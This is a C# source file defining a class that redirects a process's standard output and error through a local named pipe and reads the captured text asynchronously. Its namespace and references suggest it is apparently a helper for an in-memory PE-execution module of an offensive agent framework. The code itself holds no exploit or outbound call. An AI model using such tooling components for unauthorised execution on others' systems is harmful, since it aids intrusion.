#define NAMED_PIPE
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Reflection;
using System.IO.Pipes;
using System.IO;
using static ExecutePE.Internals.NativeDeclarations;
using Microsoft.Win32.SafeHandles;
using System.Threading.Tasks;
using System.Threading;
using ApolloInterop.Classes.Events;

namespace ExecutePE.Helpers
{

    class StdHandleRedirector : IDisposable
    {
        NamedPipeServerStream stdoutServerStream;
        NamedPipeClientStream stdoutClientStream;

        FileStream stdoutReader;

        private IntPtr _oldStdout;
        private IntPtr _oldStderr;

        private event EventHandler<StringDataEventArgs> _stdoutHandler;

        private CancellationTokenSource _cts = new CancellationTokenSource();
        private Task _stdoutReadTask;

        public StdHandleRedirector(EventHandler<StringDataEventArgs> stdoutHandler)
        {
            _stdoutHandler += stdoutHandler;

            Initialize();

            _stdoutReadTask = new Task(() =>
            {
                ReadStdoutAsync();
            });


            _stdoutReadTask.Start();
        }


        private void Initialize()
        {
            
            string stdoutGuid = Guid.NewGuid().ToString();

            stdoutServerStream = new NamedPipeServerStream(stdoutGuid, PipeDirection.InOut, 100, PipeTransmissionMode.Byte, PipeOptions.Asynchronous);
            stdoutServerStream.BeginWaitForConnection(new AsyncCallback(stdoutServerStream.EndWaitForConnection), stdoutServerStream);

            stdoutClientStream = new NamedPipeClientStream("127.0.0.1", stdoutGuid, PipeDirection.InOut, PipeOptions.Asynchronous);
            stdoutClientStream.Connect();

            stdoutReader = new FileStream(stdoutServerStream.SafePipeHandle.DangerousGetHandle(), FileAccess.Read);

            _oldStdout = GetStdHandle(StdHandles.Stdout);
            _oldStderr = GetStdHandle(StdHandles.Stderr);

            SetStdHandle(StdHandles.Stdout, stdoutClientStream.SafePipeHandle.DangerousGetHandle());
            SetStdHandle(StdHandles.Stderr, stdoutClientStream.SafePipeHandle.DangerousGetHandle());
        }

        private void ReadFileStreamAsync(FileStream stream, EventHandler<StringDataEventArgs> eventhandler)
        {
            int szBuf = 4096;
            byte[] tmp;
            int n;
            byte[] newstr;

            do
            {
                tmp = new byte[szBuf];
                n = 0;
                Task<string> t = new Task<string>(() =>
                {
                    n = stream.Read(tmp, 0, szBuf);
                    if (n > 0)
                    {
                        newstr = new byte[n];
                        Array.Copy(tmp, newstr, n);
                        return Console.OutputEncoding.GetString(newstr);
                    }
                    return null;
                });
                t.Start();
                try
                {
                    t.Wait(_cts.Token);
                }
                catch (OperationCanceledException)
                {
                    break;
                }
                if (t.Status == TaskStatus.RanToCompletion)
                {
                    eventhandler?.Invoke(this, new StringDataEventArgs(t.Result));
                }
            } while (!_cts.IsCancellationRequested);

            do
            {
                tmp = new byte[szBuf];
                n = stream.Read(tmp, 0, szBuf);
                if (n > 0)
                {
                    newstr = new byte[n];
                    Array.Copy(tmp, newstr, n);
                    eventhandler?.Invoke(this, new StringDataEventArgs(Console.OutputEncoding.GetString(newstr)));
                }
                else
                {
                    break;
                }
            } while (n > 0);
        }

        private void ReadStdoutAsync()
        {
            ReadFileStreamAsync(stdoutReader, _stdoutHandler);
        }

        public void Dispose()
        {
            SetStdHandle(StdHandles.Stderr, _oldStderr);
            SetStdHandle(StdHandles.Stdout, _oldStdout);

            stdoutClientStream.Flush();

            stdoutClientStream.Close();

            _cts.Cancel();

            Task.WaitAll(new Task[]
            {
                _stdoutReadTask
            });

            stdoutServerStream.Close();
        }
    }
}
